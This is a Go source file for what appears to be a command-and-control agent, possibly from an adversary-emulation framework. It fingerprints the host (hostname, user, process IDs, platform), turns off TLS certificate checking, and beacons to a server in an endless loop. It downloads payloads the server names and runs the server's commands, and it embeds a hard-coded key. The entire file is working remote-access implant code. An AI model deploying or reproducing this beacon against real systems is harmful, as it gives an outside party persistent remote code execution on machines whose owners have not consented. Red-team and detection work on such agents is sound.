package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"time"

	"./api"
	"./execute"
	"./util"
)

var iteration = 60

func askForInstructions(profile map[string]interface{}) {
	beacon := api.Instructions(profile)
	if beacon["sleep"] != nil {
		profile["sleep"] = beacon["sleep"]
	}
	if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
		cmds := reflect.ValueOf(beacon["instructions"])
		for i := 0; i < cmds.Len(); i++ {
			cmd := cmds.Index(i).Elem().String()
			fmt.Println("[*] Running instruction")
			command := util.Unpack([]byte(cmd))
			payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
			for _, payload := range payloads {
				if len(payload) > 0 {
					api.Drop(profile["server"].(string), payload)
				}
			}
			api.Execute(profile, command)
		}
	} else {
		time.Sleep(time.Duration(profile["sleep"].(int)) * time.Second)
	}
}

func buildProfile(server string, group string, executors []string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	profile := make(map[string]interface{})
	profile["paw"] = paw
	profile["server"] = server
	profile["group"] = group
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["sleep"] = iteration
	profile["pid"] = strconv.Itoa(os.Getpid())
	profile["ppid"] = strconv.Itoa(os.Getppid())
	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
	return profile
}

func main() {
	var executors execute.ExecutorFlags
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
	group := flag.String("group", "my_group", "Attach a group to this agent")
	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
	flag.Parse()
	profile := buildProfile(*server, *group, executors)
	for {
		askForInstructions(profile)
	}
}

var key = "IQD1Z334GD1CQMTH3Z82X7QF7OS105"